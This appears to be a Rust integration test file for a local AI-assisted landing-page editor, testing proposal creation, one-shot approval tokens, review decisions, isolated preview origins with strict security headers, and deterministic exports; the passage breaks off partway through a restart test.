use super::*;
use axum::body::to_bytes;
use axum::http::Request;
use serde_json::Value;
use std::io::Read;
use synapse_artifact_journal::{
    ReviewId as JournalReviewId, ReviewState as JournalReviewState, SqliteReviewJournal,
};
use synapse_core::Repository as SynapseRepository;
use tempfile::TempDir;
use tower::ServiceExt;

const EDITOR_ORIGIN: &str = "http://editor.test:4321";
const EDITOR_HOST: &str = "editor.test:4321";
const PREVIEW_ORIGIN: &str = "http://localhost:4322";
static SYNAPSEGIT_WORKFLOW_TEST_LOCK: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());

struct Harness {
    _root: TempDir,
    _import: Option<TempDir>,
    state: StudioState,
    token: String,
}

impl Harness {
    async fn new() -> Self {
        Self::with_optional_import(None).await
    }

    async fn with_import(import: TempDir) -> Self {
        Self::with_optional_import(Some(import)).await
    }

    async fn with_optional_import(import: Option<TempDir>) -> Self {
        let root = tempfile::tempdir().expect("temp root");
        let config = ServerConfig::new(
            EDITOR_ORIGIN,
            EDITOR_HOST,
            PREVIEW_ORIGIN,
            root.path(),
            root.path().join("missing-web-dist"),
        )
        .with_import_root(import.as_ref().map(|source| source.path().to_path_buf()));
        let state = StudioState::new(config).expect("state");
        let token = bootstrap_token(&state).await;
        Self {
            _root: root,
            _import: import,
            state,
            token,
        }
    }

    async fn post(&self, uri: &str, payload: Value) -> Response {
        self.post_with_token(uri, payload, &self.token).await
    }

    async fn post_with_token(&self, uri: &str, payload: Value, token: &str) -> Response {
        post_for(&self.state, token, uri, payload).await
    }

    async fn patch(&self, uri: &str, payload: Value) -> Response {
        patch_for(&self.state, &self.token, uri, payload).await
    }

    async fn get(&self, uri: &str) -> Response {
        editor_router(self.state.clone())
            .oneshot(
                Request::builder()
                    .uri(uri)
                    .header(HOST, EDITOR_HOST)
                    .header(AUTHORIZATION, format!("Bearer {}", self.token))
                    .body(Body::empty())
                    .expect("request"),
            )
            .await
            .expect("response")
    }

    async fn restart(self) -> Self {
        let Self {
            _root,
            _import,
            state,
            token: _,
        } = self;
        drop(state);
        let config = ServerConfig::new(
            EDITOR_ORIGIN,
            EDITOR_HOST,
            PREVIEW_ORIGIN,
            _root.path(),
            _root.path().join("missing-web-dist"),
        )
        .with_import_root(_import.as_ref().map(|source| source.path().to_path_buf()));
        let state = StudioState::new(config).expect("restarted state");
        let token = bootstrap_token(&state).await;
        Self {
            _root,
            _import,
            state,
            token,
        }
    }
}

async fn post_for(state: &StudioState, token: &str, uri: &str, payload: Value) -> Response {
    editor_router(state.clone())
        .oneshot(
            Request::builder()
                .method("POST")
                .uri(uri)
                .header(HOST, EDITOR_HOST)
                .header(ORIGIN, EDITOR_ORIGIN)
                .header("sec-fetch-site", "same-origin")
                .header(CONTENT_TYPE, "application/json")
                .header(AUTHORIZATION, format!("Bearer {token}"))
                .body(Body::from(serde_json::to_vec(&payload).expect("json")))
                .expect("request"),
        )
        .await
        .expect("response")
}

async fn patch_for(state: &StudioState, token: &str, uri: &str, payload: Value) -> Response {
    editor_router(state.clone())
        .oneshot(
            Request::builder()
                .method("PATCH")
                .uri(uri)
                .header(HOST, EDITOR_HOST)
                .header(ORIGIN, EDITOR_ORIGIN)
                .header("sec-fetch-site", "same-origin")
                .header(CONTENT_TYPE, "application/json")
                .header(AUTHORIZATION, format!("Bearer {token}"))
                .body(Body::from(serde_json::to_vec(&payload).expect("json")))
                .expect("request"),
        )
        .await
        .expect("response")
}

async fn raw_patch_for(
    state: &StudioState,
    uri: &str,
    payload: &Value,
    headers: &[(&str, &str)],
) -> Response {
    let mut request = Request::builder().method("PATCH").uri(uri);
    for (name, value) in headers {
        request = request.header(*name, *value);
    }
    editor_router(state.clone())
        .oneshot(
            request
                .body(Body::from(serde_json::to_vec(payload).expect("json")))
                .expect("request"),
        )
        .await
        .expect("response")
}

async fn get_for(state: &StudioState, token: &str, uri: &str) -> Response {
    editor_router(state.clone())
        .oneshot(
            Request::builder()
                .uri(uri)
                .header(HOST, EDITOR_HOST)
                .header(AUTHORIZATION, format!("Bearer {token}"))
                .body(Body::empty())
                .expect("request"),
        )
        .await
        .expect("response")
}

async fn get_preview_for(state: &StudioState, url: &str) -> Response {
    get_preview_with_binding(state, preview_host(url), preview_path(url)).await
}

async fn get_preview_with_binding(state: &StudioState, host: &str, path: &str) -> Response {
    preview_router(state.clone())
        .oneshot(
            Request::builder()
                .uri(path)
                .header(HOST, host)
                .body(Body::empty())
                .expect("preview request"),
        )
        .await
        .expect("preview response")
}

async fn bootstrap_token(state: &StudioState) -> String {
    let response = editor_router(state.clone())
        .oneshot(
            Request::builder()
                .uri("/api/v1/bootstrap")
                .header(HOST, EDITOR_HOST)
                .header("sec-fetch-site", "same-origin")
                .body(Body::empty())
                .expect("request"),
        )
        .await
        .expect("bootstrap response");
    assert_eq!(response.status(), StatusCode::OK);
    response_json(response).await["session"]["token"]
        .as_str()
        .expect("session token")
        .to_owned()
}

fn test_target_id(seed: u128) -> String {
    format!("tgt_{seed:032x}")
}

fn target_request(revision_id: &str, seed: u128, kind: &str, element_id: &str) -> Value {
    target_request_for_source(revision_id, seed, kind, element_id, "accepted", None)
}

fn target_request_for_source(
    revision_id: &str,
    seed: u128,
    kind: &str,
    element_id: &str,
    capture_source: &str,
    capture_proposal_id: Option<&str>,
) -> Value {
    let (tag_name, label, accessible_name) = match element_id {
        "hero" => ("section", "ヒーローブロック", "ヒーローブロック"),
        "hero-copy" => (
            "p",
            "ヒーロー説明文",
            "伝えたいことを選び、AIとの対話から最初の一歩をつくります。",
        ),
        "hero-cta" => ("a", "ヒーローCTA", "構想を始める"),
        _ => ("h1", "ヒーロー見出し", "まだ、白紙です。"),
    };
    let element_anchor = json!({
        "tagName":tag_name,
        "uniqueElementId":element_id,
        "accessibleName":accessible_name,
        "domPath":format!("main/{tag_name}#{element_id}")
    });
    let geometry = json!({
        "documentCssPixelRect":{"x":80.0,"y":120.0,"width":640.0,"height":96.0},
        "viewportCssPixelRect":{"x":80.0,"y":120.0,"width":640.0,"height":96.0},
        "viewportNormalizedRect":{"x":0.05,"y":0.1,"width":0.4,"height":0.08}
    });
    let mut target = json!({
        "schemaVersion":1,
        "targetId":test_target_id(seed),
        "captureRevisionId":revision_id,
        "captureSource":capture_source,
        "pagePath":"index.html",
        "kind":kind,
        "label":label,
        "viewport":{
            "cssWidth":1600.0,
            "cssHeight":1200.0,
            "scrollX":0.0,
            "scrollY":0.0,
            "devicePixelRatio":1.0,
            "visualViewportScale":1.0,
            "previewScale":1.0
        },
        "document":{"cssWidth":1600.0,"cssHeight":2400.0,"layoutEpoch":1}
    });
    if let Some(proposal_id) = capture_proposal_id {
        target["captureProposalId"] = json!(proposal_id);
    }
    match kind {
        "page" => {}
        "block" => {
            target["geometry"] = geometry;
            target["elementAnchor"] = element_anchor;
            target["block"] = json!({"source":"semantic","level":1});
        }
        "element" => {
            target["geometry"] = geometry;
            target["elementAnchor"] = element_anchor;
        }
        "text" => {
            target["geometry"] = geometry;
            target["elementAnchor"] = element_anchor;
            target["textAnchor"] = json!({
                "exact":accessible_name,
                "startOffset":0,
                "endOffset":accessible_name.encode_utf16().count()
            });
        }
        "point" => {
            target["point"] = json!({
                "documentCssPixel":{"x":120.0,"y":160.0},
                "viewportNormalized":{"x":0.075,"y":0.1333333333}
            });
            target["regionAnchor"] = json!({"containingBlock":element_anchor,"layoutMode":"flow"});
        }
        "region" => {
            target["geometry"] = geometry;
            target["regionAnchor"] = json!({"containingBlock":element_anchor,"layoutMode":"flow"});
        }
        _ => panic!("unsupported test target kind: {kind}"),
    }
    json!({"schemaVersion":"1","target":target})
}

fn element_target_request(revision_id: &str, seed: u128, element_id: &str) -> Value {
    target_request(revision_id, seed, "element", element_id)
}

fn oversized_canonical_target_request(revision_id: &str, seed: u128) -> Value {
    const BODY_LIMIT: usize = 64 * 1024 - 1;
    for token_count in 1..=8 {
        for token_chars in 3..=128 {
            let class_tokens = (0..token_count)
                .map(|index| {
                    let prefix = format!("c{index:02}");
                    format!("{prefix}{}", "界".repeat(token_chars - prefix.len()))
                })
                .collect::<Vec<_>>();
            let anchor = json!({
                "tagName":"section",
                "uniqueElementId":"界".repeat(MAX_TARGET_ANCHOR_LENGTH),
                "role":"界".repeat(MAX_TARGET_CLASS_TOKEN_LENGTH),
                "accessibleName":"界".repeat(512),
                "domPath":"界".repeat(MAX_TARGET_ANCHOR_LENGTH),
                "classTokens":class_tokens,
                "ancestorFingerprint":"界".repeat(MAX_TARGET_ANCHOR_LENGTH)
            });
            let mut request = target_request(revision_id, seed, "region", "hero-heading");
            request["target"]["label"] = json!("x");
            request["target"]["viewport"] = json!({
                "cssWidth":8,
                "cssHeight":8,
                "scrollX":0,
                "scrollY":0,
                "devicePixelRatio":1,
                "visualViewportScale":1,
                "previewScale":1
            });
            request["target"]["document"] = json!({"cssWidth":8,"cssHeight":8,"layoutEpoch":1});
            request["target"]["geometry"] = json!({
                "documentCssPixelRect":{"x":0,"y":0,"width":8,"height":8},
                "viewportCssPixelRect":{"x":0,"y":0,"width":8,"height":8},
                "viewportNormalizedRect":{"x":0,"y":0,"width":1,"height":1}
            });
            request["target"]["regionAnchor"] = json!({
                "containingBlock":anchor,
                "previousVisibleSibling":anchor,
                "nextVisibleSibling":anchor,
                "layoutMode":"flow"
            });

            let initial_length = serde_json::to_vec(&request).unwrap().len();
            if initial_length > BODY_LIMIT {
                continue;
            }
            let label_padding = BODY_LIMIT - initial_length;
            if label_padding >= MAX_TARGET_LABEL_LENGTH {
                continue;
            }
            request["target"]["label"] = json!("x".repeat(label_padding + 1));
            assert_eq!(serde_json::to_vec(&request).unwrap().len(), BODY_LIMIT);
            let parsed: CreateTargetRequest = serde_json::from_value(request.clone()).unwrap();
            assert!(validate_target_shape(&parsed.target).is_ok());
            assert!(
                serde_json::to_vec(&parsed.target).unwrap().len()
                    > STORAGE_MAX_TARGET_METADATA_BYTES
            );
            return request;
        }
    }
    panic!("failed to construct a shape-valid request with oversized canonical metadata");
}

fn context_request(revision_id: &str, target_response: &Value, instruction: &str) -> Value {
    let target_id = string_at(target_response, "/target/targetId");
    json!({
        "schemaVersion":"1",
        "attemptId":format!("attempt-{target_id}"),
        "revisionId":revision_id,
        "targetId":target_id,
        "resolutionId":string_at(target_response, "/resolutionId"),
        "providerId":"fake",
        "requestedModel":"deterministic-v1",
        "instruction":instruction
    })
}

async fn create_blank_fake_proposal(
    harness: &Harness,
    seed: u128,
) -> (String, String, String, String) {
    let project = harness
        .post(
            "/api/v1/projects",
            json!({"schemaVersion":"1","template":"blank"}),
        )
        .await;
    assert_eq!(project.status(), StatusCode::CREATED);
    let project = response_json(project).await;
    let project_id = string_at(&project, "/project/id");
    let revision_id = string_at(&project, "/project/revisionId");
    let target = harness
        .post(
            &format!("/api/v1/projects/{project_id}/targets"),
            element_target_request(&revision_id, seed, "hero-heading"),
        )
        .await;
    assert_eq!(target.status(), StatusCode::CREATED);
    let target = response_json(target).await;
    let context = harness
        .post(
            &format!("/api/v1/projects/{project_id}/contexts"),
            context_request(&revision_id, &target, "見出しを変更してください。"),
        )
        .await;
    assert_eq!(context.status(), StatusCode::CREATED);
    let context = response_json(context).await;
    let proposal = harness
        .post(
            &format!("/api/v1/projects/{project_id}/proposals"),
            json!({
                "schemaVersion":"1",
                "contextId":string_at(&context, "/context/id"),
                "contextSha256":string_at(&context, "/context/sha256")
            }),
        )
        .await;
    assert_eq!(proposal.status(), StatusCode::CREATED);
    let proposal = response_json(proposal).await;
    (
        project_id,
        revision_id,
        string_at(&proposal, "/proposal/id"),
        string_at(&proposal, "/proposal/reviewId"),
    )
}

async fn create_fake_proposal_for_project(
    harness: &Harness,
    project_id: &str,
    revision_id: &str,
    seed: u128,
) -> Value {
    let target = harness
        .post(
            &format!("/api/v1/projects/{project_id}/targets"),
            element_target_request(revision_id, seed, "hero-heading"),
        )
        .await;
    assert_eq!(target.status(), StatusCode::CREATED);
    let target = response_json(target).await;
    let context = harness
        .post(
            &format!("/api/v1/projects/{project_id}/contexts"),
            context_request(revision_id, &target, "見出しを変更してください。"),
        )
        .await;
    assert_eq!(context.status(), StatusCode::CREATED);
    let context = response_json(context).await;
    let proposal = harness
        .post(
            &format!("/api/v1/projects/{project_id}/proposals"),
            json!({
                "schemaVersion":"1",
                "contextId":string_at(&context, "/context/id"),
                "contextSha256":string_at(&context, "/context/sha256")
            }),
        )
        .await;
    let status = proposal.status();
    let proposal = response_json(proposal).await;
    assert_eq!(
        status,
        StatusCode::CREATED,
        "proposal seed {seed}: {proposal:#}"
    );
    proposal
}

async fn prepare_faulted_decision(
    harness: &Harness,
    disposition: &str,
    seed: u128,
) -> (String, String, String, Value) {
    let (project_id, revision_id, proposal_id, review_id) =
        create_blank_fake_proposal(harness, seed).await;
    let intent_id = format!("fault-matrix-{seed}");
    let approval = harness
        .post(
            &format!("/api/v1/reviews/{review_id}/approvals"),
            json!({
                "schemaVersion":"1",
                "proposalId":proposal_id,
                "expectedRevisionId":revision_id,
                "disposition":disposition,
                "intentId":intent_id
            }),
        )
        .await;
    assert_eq!(approval.status(), StatusCode::CREATED);
    let approval_token = string_at(&response_json(approval).await, "/approval/token");
    let request = json!({
        "schemaVersion":"1",
        "approvalToken":approval_token,
        "proposalId":proposal_id,
        "expectedRevisionId":revision_id,
        "disposition":disposition,
        "intentId":intent_id,
        "rationale":"fault matrix private rationale"
    });
    (project_id, revision_id, review_id, request)
}

fn transition_review_to_terminal_denial(
    harness: &Harness,
    project_id: &str,
    review_id: &str,
) -> (String, String) {
    let (repository_path, journal_path) = harness
        .state
        .storage()
        .unwrap()
        .synapse_paths(project_id)
        .unwrap();
    let review_id = JournalReviewId::parse(review_id.to_owned()).unwrap();
    let mut journal = SqliteReviewJournal::open(journal_path).unwrap();
    let review = journal.get_review(&review_id).unwrap();
    let proposal_ref = review.binding().proposal_ref_name().to_owned();
    let proposal_head = review.binding().proposal_head().to_owned();
    assert_eq!(review.state(), JournalReviewState::PendingReview);
    assert_eq!(
        journal
            .transition_review_state(
                &review_id,
                JournalReviewState::PendingReview,
                JournalReviewState::TerminalDenial,
            )
            .unwrap()
            .state(),
        JournalReviewState::TerminalDenial
    );
    let repository = SynapseRepository::open(repository_path).unwrap();
    assert_eq!(
        repository.refs().get(&proposal_ref).unwrap().unwrap().head,
        proposal_head
    );
    (proposal_ref, proposal_head)
}

async fn reconcile_and_cleanup_failed_proposal(
    harness: &Harness,
    project_id: &str,
    proposal_id: &str,
    review_id: &str,
) {
    let reconciled = harness
        .post(
            &format!("/api/v1/operations/reviews/{review_id}/reconcile"),
            json!({"schemaVersion":"1"}),
        )
        .await;
    assert_eq!(reconciled.status(), StatusCode::OK);
    assert_eq!(
        response_json(reconciled).await["review"]["status"],
        "failed"
    );

    let cleanup = harness
        .post(
            "/api/v1/retention/cleanup",
            json!({
                "schemaVersion":"1",
                "scope":"failed_proposal",
                "projectId":project_id,
                "proposalId":proposal_id,
                "reviewId":review_id,
                "confirmation":proposal_id
            }),
        )
        .await;
    assert_eq!(cleanup.status(), StatusCode::OK);
    assert_eq!(
        response_json(cleanup).await["removed"]["scope"],
        "failed_proposal"
    );
}

#[tokio::test]
async fn complete_real_synapsegit_flow_adopts_only_after_one_shot_approval() {
    // Production proposal creation is serialized by the single Store mutex.
    // Mirror that boundary across otherwise-independent test StudioState values.
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    let mut harness = Harness::new().await;
    let create = harness
        .post(
            "/api/v1/projects",
            json!({"schemaVersion":"1","template":"blank"}),
        )
        .await;
    assert_eq!(create.status(), StatusCode::CREATED);
    let create_body = response_json(create).await;
    let project_id = string_at(&create_body, "/project/id");
    let original_revision = string_at(&create_body, "/project/revisionId");
    let original_manifest = string_at(&create_body, "/project/acceptedManifestSha256");
    let accepted_preview_url = string_at(&create_body, "/project/previewUrl");
    assert_eq!(
        create_body["project"]["displayName"],
        "Untitled landing page"
    );
    assert_eq!(create_body["project"]["files"].as_array().unwrap().len(), 2);

    let target = harness
        .post(
            &format!("/api/v1/projects/{project_id}/targets"),
            element_target_request(&original_revision, 1, "hero-heading"),
        )
        .await;
    assert_eq!(target.status(), StatusCode::CREATED);
    let target = response_json(target).await;

    let context = harness
        .post(
            &format!("/api/v1/projects/{project_id}/contexts"),
            context_request(
                &original_revision,
                &target,
                "見出しを公開に向けた言葉へ変更してください。",
            ),
        )
        .await;
    assert_eq!(context.status(), StatusCode::CREATED);
    let context_body = response_json(context).await;
    let context_id = string_at(&context_body, "/context/id");
    let context_sha = string_at(&context_body, "/context/sha256");
    let canonical = string_at(&context_body, "/context/canonicalJson");
    assert_eq!(context_body["context"]["providerId"], "fake");
    assert_eq!(
        context_body["context"]["requestedModel"],
        "deterministic-v1"
    );
    assert_eq!(context_body["context"]["provider"]["external"], false);
    assert!(
        context_body["context"]["manifest"]["entries"]
            .as_array()
            .is_some_and(|entries| !entries.is_empty())
    );
    assert_eq!(
        review_context_sha256(canonical.as_bytes()).unwrap(),
        context_sha
    );

    let proposal = harness
        .post(
            &format!("/api/v1/projects/{project_id}/proposals"),
            json!({
                "schemaVersion":"1",
                "contextId":context_id,
                "contextSha256":context_sha
            }),
        )
        .await;
    assert_eq!(proposal.status(), StatusCode::CREATED);
    let proposal_body = response_json(proposal).await;
    let proposal_id = string_at(&proposal_body, "/proposal/id");
    let review_id = string_at(&proposal_body, "/proposal/reviewId");
    let proposal_digest = string_at(&proposal_body, "/proposal/artifactManifestSha256");
    let proposal_preview_url = string_at(&proposal_body, "/proposal/previewUrl");
    assert_ne!(accepted_preview_url, proposal_preview_url);
    assert_ne!(
        preview_host(&accepted_preview_url),
        preview_host(&proposal_preview_url),
        "each snapshot must receive an isolated origin"
    );
    assert_ne!(proposal_digest, original_manifest);
    assert_eq!(proposal_body["proposal"]["executionVerified"], false);
    assert_eq!(proposal_body["proposal"]["validation"]["status"], "passed");
    let validation_checks = proposal_body["proposal"]["validation"]["checks"]
        .as_array()
        .unwrap();
    assert!(validation_checks.iter().any(|check| {
        check["id"] == "target-reresolution"
            && check["status"] == "passed"
            && check["blocking"] == false
    }));
    assert!(
        proposal_body["proposal"]["unifiedDiff"]
            .as_str()
            .unwrap()
            .contains("対話から、公開できるLPへ。")
    );
    let public_proposal = serde_json::to_string(&proposal_body).unwrap();
    for forbidden in [
        "proposal/artifact/",
        "decision/artifact/",
        "actor_oid",
        "policy_oid",
        "grant_oid",
        "permit",
        "repository_path",
    ] {
        assert!(!public_proposal.contains(forbidden), "leaked {forbidden}");
    }

    let accepted_before = harness.get(&format!("/api/v1/projects/{project_id}")).await;
    assert_eq!(
        response_json(accepted_before).await["project"]["acceptedManifestSha256"],
        original_manifest
    );

    let proposal_preview = preview_router(harness.state.clone())
        .oneshot(
            Request::builder()
                .uri(format!("/preview/{project_id}/{proposal_id}/"))
                .header(HOST, preview_host(&proposal_preview_url))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(proposal_preview.status(), StatusCode::OK);
    let preview_headers = proposal_preview.headers();
    assert_eq!(preview_headers.get(CACHE_CONTROL).unwrap(), "no-store");
    assert_eq!(
        preview_headers.get("clear-site-data").unwrap(),
        "\"cache\", \"cookies\", \"storage\""
    );
    assert_eq!(
        preview_headers.get("x-content-type-options").unwrap(),
        "nosniff"
    );
    assert_eq!(
        preview_headers.get("referrer-policy").unwrap(),
        "no-referrer"
    );
    assert_eq!(
        preview_headers.get("x-dns-prefetch-control").unwrap(),
        "off"
    );
    assert!(
        preview_headers
            .get("permissions-policy")
            .unwrap()
            .to_str()
            .unwrap()
            .contains("camera=()")
    );
    let preview_csp = preview_headers
        .get("content-security-policy")
        .unwrap()
        .to_str()
        .unwrap();
    assert!(preview_csp.contains("frame-ancestors http://editor.test:4321"));
    assert!(preview_csp.contains("script-src 'self' 'nonce-"));
    assert!(preview_csp.contains("worker-src 'none'"));
    assert!(preview_csp.contains("frame-src 'none'"));
    assert!(preview_csp.contains("connect-src 'none'"));
    assert!(preview_csp.contains("webrtc 'block'"));
    assert!(preview_csp.contains("form-action 'none'"));
    assert!(!preview_csp.contains("script-src 'unsafe-inline'"));
    let preview_html = response_text(proposal_preview).await;
    assert!(preview_html.contains("対話から、公開できるLPへ。"));
    assert!(preview_html.contains("synapsegit-lp.selection"));
    assert!(preview_html.contains("synapsegit-lp.diagnostic"));
    assert!(preview_html.contains("securitypolicyviolation"));
    assert!(preview_html.contains("csp_blocked"));
    assert!(preview_html.contains("site_error"));
    assert!(preview_html.contains("unhandled_rejection"));
    assert!(preview_html.contains("sourceUnavailable:true"));
    assert!(preview_html.contains("window.name=\"\""));
    assert!(preview_html.contains("pending.splice(0).forEach(send)"));
    assert!(preview_html.contains("nav.addEventListener(\"navigate\""));
    assert!(preview_html.contains("e.preventDefault()"));
    assert!(preview_html.contains("Object.defineProperty(owner,name"));
    assert!(preview_html.contains("RTCPeerConnection"));
    assert!(!preview_html.contains("e.message"));
    assert!(!preview_html.contains("e.filename"));
    assert!(!preview_html.contains("e.stack"));
    assert!(preview_html.contains("channelId:channel"));
    assert!(preview_html.contains(&format!(
        "S={}",
        serde_json::to_string(&proposal_id).unwrap()
    )));
    assert!(preview_html.contains(&format!(
        "R={}",
        serde_json::to_string(&original_revision).unwrap()
    )));

    let preview_api = preview_router(harness.state.clone())
        .oneshot(
            Request::builder()
                .uri("/api/v1/bootstrap")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(preview_api.status(), StatusCode::NOT_FOUND);

    let second = harness
        .post(
            &format!("/api/v1/projects/{project_id}/proposals"),
            json!({
                "schemaVersion":"1",
                "contextId":context_id,
                "contextSha256":context_sha
            }),
        )
        .await;
    assert_eq!(second.status(), StatusCode::CONFLICT);
    assert_eq!(
        response_json(second).await["error"]["code"],
        "artifact_single_proposal_limit"
    );

    let intent = "intent-e2e-0001";
    let approval = harness
        .post(
            &format!("/api/v1/reviews/{review_id}/approvals"),
            json!({
                "schemaVersion":"1",
                "proposalId":proposal_id,
                "expectedRevisionId":original_revision,
                "disposition":"adopted_unchanged",
                "intentId":intent
            }),
        )
        .await;
    assert_eq!(approval.status(), StatusCode::CREATED);
    let approval_token = string_at(&response_json(approval).await, "/approval/token");

    let decision_request = json!({
        "schemaVersion":"1",
        "approvalToken":approval_token,
        "proposalId":proposal_id,
        "expectedRevisionId":original_revision,
        "disposition":"adopted_unchanged",
        "intentId":intent,
        "rationale":"内容と差分を確認して採用します。"
    });
    let decision = harness
        .post(
            &format!("/api/v1/reviews/{review_id}/decisions"),
            decision_request.clone(),
        )
        .await;
    assert_eq!(decision.status(), StatusCode::OK);
    let decision_body = response_json(decision).await;
    let adopted_revision = string_at(&decision_body, "/project/revisionId");
    assert_ne!(adopted_revision, original_revision);
    assert_eq!(
        decision_body["project"]["acceptedManifestSha256"],
        proposal_digest
    );
    assert_uniform_preview_not_found(get_preview_for(&harness.state, &proposal_preview_url).await)
        .await;

    let replay = harness
        .post(
            &format!("/api/v1/reviews/{review_id}/decisions"),
            decision_request,
        )
        .await;
    assert_eq!(replay.status(), StatusCode::CONFLICT);
    assert_eq!(
        response_json(replay).await["error"]["code"],
        "approval_invalid_or_consumed"
    );

    let export_one = harness
        .post(
            &format!("/api/v1/projects/{project_id}/exports"),
            json!({"schemaVersion":"1","revisionId":adopted_revision}),
        )
        .await;
    assert_eq!(export_one.status(), StatusCode::CREATED);
    let export_one_body = response_json(export_one).await;
    let first_sha = string_at(&export_one_body, "/export/sha256");
    let first_url = string_at(&export_one_body, "/export/downloadUrl");
    let first_zip = response_bytes(harness.get(&first_url).await).await;

    let export_two = harness
        .post(
            &format!("/api/v1/projects/{project_id}/exports"),
            json!({"schemaVersion":"1","revisionId":adopted_revision}),
        )
        .await;
    let export_two_body = response_json(export_two).await;
    assert_eq!(export_two_body["export"]["sha256"], first_sha);
    let second_zip = response_bytes(
        harness
            .get(export_two_body["export"]["downloadUrl"].as_str().unwrap())
            .await,
    )
    .await;
    assert_eq!(first_zip, second_zip);

    let publication = harness
        .post(
            &format!("/api/v1/projects/{project_id}/publications"),
            json!({
                "schemaVersion":"1",
                "revisionId":adopted_revision,
                "publicLabel":"Example LP",
                "title":"Reviewed landing page",
                "summary":"A local-only publication projection for review.",
                "publicDecisionNote":"Approved for this local draft."
            }),
        )
        .await;
    assert_eq!(publication.status(), StatusCode::CREATED);
    let publication = response_json(publication).await;
    assert_eq!(publication["publication"]["networkWrites"], false);
    assert_eq!(
        publication["publication"]["remotePublication"],
        "separate_human_action"
    );
    let publication_url = string_at(&publication, "/publication/downloadUrl");
    let publication_zip = response_bytes(harness.get(&publication_url).await).await;

    harness = harness.restart().await;
    assert_eq!(
        response_bytes(harness.get(&first_url).await).await,
        first_zip
    );
    assert_eq!(
        response_bytes(harness.get(&publication_url).await).await,
        publication_zip
    );

    let mut archive = zip::ZipArchive::new(Cursor::new(first_zip)).unwrap();
    assert_eq!(archive.len(), 2);
    assert_eq!(archive.by_index(0).unwrap().name(), "index.html");
    assert_eq!(archive.by_index(1).unwrap().name(), "styles.css");
    let mut index = String::new();
    archive
        .by_name("index.html")
        .unwrap()
        .read_to_string(&mut index)
        .unwrap();
    assert!(index.contains("対話から、公開できるLPへ。"));
    assert!(!index.contains("synapsegit-lp.selection"));
    assert!(!index.contains("synapsegit-lp.diagnostic"));
    assert!(!index.contains("window.name=\"\""));
}

#[tokio::test]
async fn publication_prefers_the_active_proposal_over_older_terminal_history() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    let harness = Harness::new().await;
    let (project_id, revision_id, review_id, decision_request) =
        prepare_faulted_decision(&harness, "rejected", 1_900).await;
    let decision = harness
        .post(
            &format!("/api/v1/reviews/{review_id}/decisions"),
            decision_request,
        )
        .await;
    assert_eq!(decision.status(), StatusCode::OK);
    assert_eq!(
        response_json(decision).await["decision"]["disposition"],
        "rejected"
    );

    let active = create_fake_proposal_for_project(&harness, &project_id, &revision_id, 1_901).await;
    let active_manifest = string_at(&active, "/proposal/artifactManifestSha256");
    let publication = harness
        .post(
            &format!("/api/v1/projects/{project_id}/publications"),
            json!({
                "schemaVersion":"1",
                "revisionId":revision_id,
                "publicLabel":"Current review",
                "title":"Active proposal truth",
                "summary":"The current incomplete session must outrank older terminal history."
            }),
        )
        .await;
    assert_eq!(publication.status(), StatusCode::CREATED);
    let publication = response_json(publication).await;
    let archive_bytes = response_bytes(
        harness
            .get(string_at(&publication, "/publication/downloadUrl").as_str())
            .await,
    )
    .await;
    let mut archive = zip::ZipArchive::new(Cursor::new(archive_bytes)).unwrap();
    let mut projection_bytes = Vec::new();
    archive
        .by_name("projection.json")
        .unwrap()
        .read_to_end(&mut projection_bytes)
        .unwrap();
    let projection: Value = serde_json::from_slice(&projection_bytes).unwrap();

    assert_eq!(projection["session"]["completeness"]["state"], "incomplete");
    assert_eq!(
        projection["session"]["completeness"]["incompleteReason"],
        "proposal_pending"
    );
    assert_eq!(
        projection["session"]["proposal"]["manifestSha256"]["value"],
        active_manifest
    );
    assert!(projection["session"]["humanDecision"].is_null());
}

#[tokio::test]
async fn private_decision_memo_is_absent_from_the_entire_managed_state_tree() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    let harness = Harness::new().await;
    let (_project_id, _revision_id, review_id, mut decision_request) =
        prepare_faulted_decision(&harness, "adopted_unchanged", 1_902).await;
    let private_canary = "RAW_PRIVATE_MEMO_STATE_ROOT_CANARY_7c41_keep_ephemeral";
    decision_request["rationale"] = json!(private_canary);
    let decision = harness
        .post(
            &format!("/api/v1/reviews/{review_id}/decisions"),
            decision_request,
        )
        .await;
    assert_eq!(decision.status(), StatusCode::OK);

    for (path, bytes) in source_fingerprint(harness._root.path()) {
        assert!(
            !bytes
                .windows(private_canary.len())
                .any(|window| window == private_canary.as_bytes()),
            "private Decision memo persisted at {path}"
        );
    }
}

#[tokio::test]
async fn pending_reviews_and_all_terminal_decisions_rehydrate_across_restart() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    for (index, disposition) in ["adopted_unchanged", "rejected", "deferred"]
        .into_iter()
        .enumerate()
    {
        let harness = Harness::new().await;
        let (project_id, base_revision_id, proposal_id, review_id) =
            create_blank_fake_proposal(&harness, 2_000 + index as u128).await;
        let harness = harness.restart().await;

        let project =
            response_json(harness.get(&format!("/api/v1/projects/{project_id}")).await).await;
        assert_eq!(project["project"]["activeReview"]["reviewId"], review_id);
        assert_eq!(
            project["project"]["activeReview"]["proposalId"],
            proposal_id
        );
        assert_eq!(
            project["project"]["activeReview"]["status"],
            "pending_review"
        );
        assert_eq!(project["project"]["history"], json!([]));

        let pending_review =
            response_json(harness.get(&format!("/api/v1/reviews/{review_id}")).await).await;
        assert_eq!(pending_review["review"]["proposalId"], proposal_id);
        assert_eq!(pending_review["review"]["status"], "pending_review");
        assert_eq!(pending_review["review"]["reconciliationRequired"], false);
        assert_eq!(pending_review["review"]["decision"], Value::Null);
        assert_eq!(
            pending_review["review"]["proposal"]["target"]["captureRevisionId"],
            base_revision_id
        );
        assert_eq!(
            pending_review["review"]["proposal"]["targetResolution"]["status"],
            "resolved"
        );
        assert_eq!(
            pending_review["review"]["proposal"]["instruction"],
            "見出しを変更してください。"
        );

        let intent_id = format!("restart-terminal-{index}");
        let approval = harness
            .post(
                &format!("/api/v1/reviews/{review_id}/approvals"),
                json!({
                    "schemaVersion":"1",
                    "proposalId":proposal_id,
                    "expectedRevisionId":base_revision_id,
                    "disposition":disposition,
                    "intentId":intent_id
                }),
            )
            .await;
        assert_eq!(approval.status(), StatusCode::CREATED);
